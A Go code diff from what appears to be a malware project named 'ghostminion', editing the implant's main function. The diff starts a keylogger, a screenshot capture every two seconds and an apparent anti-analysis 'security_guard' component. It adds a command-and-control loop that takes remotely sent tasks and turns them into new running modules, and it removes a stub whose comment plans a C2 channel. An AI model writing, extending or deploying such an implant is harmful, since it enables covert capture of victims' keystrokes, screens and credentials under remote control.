@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"ghostminion/apps"
+	"ghostminion/communication"
 	"ghostminion/config"
 	"ghostminion/db"
 	"ghostminion/hider"
@@ -34,39 +35,20 @@ func main() {
 	fmt.Println("targetId:", targetId)
 
 	appManager := apps.GetAppManagerInstance()
-
-	addBuiltinApps(appManager)
+	appManager.AddApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
+	appManager.AddApp(string(apps.ScreenShotTask)+"_default", &apps.ScreenshotApp{Interval: 2})
+	appManager.AddApp("security_guard", &apps.SecurityGuardApp{})
 	appManager.StartAll(&wg)
 
-	app, err := appManager.GetApp("security_guard")
-	if err != nil {
-		log.Fatalf("failed to get security_guard app: %v", err)
+	taskCh := make(chan apps.AppData)
+	go communication.Routine(taskCh)
+	for task := range taskCh {
+		if app, err := apps.NewAppFactory(task); err != nil {
+			log.Print(err)
+		} else {
+			appManager.AddApp(task.Name, app)
+		}
 	}
-	securityGuard, ok := app.(*apps.SecurityGuardApp)
-	if !ok {
-		log.Fatalf("failed to cast security_guard app to SecurityGuardApp")
-	}
-	for securityGuard.IsSafeToRun() {
-		go run()
-	}
+
 	appManager.StopAll()
-}
-
-func addBuiltinApps(am *apps.AppManager) {
-	am.AddApp("keylogger", &apps.KeyLoggerApp{})
-	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2})
-	securityGuard := &apps.SecurityGuardApp{}
-	err := securityGuard.Validate()
-	if err != nil {
-		return
-	}
-	am.AddApp("security_guard", &securityGuard)
-}
-
-func run() {
-	/* communicate with C2
-	send data (how much should I send per round?)
-	get requests (get them all and run) - build package for running direct commands and get files
-	store the new data
-	*/
 }
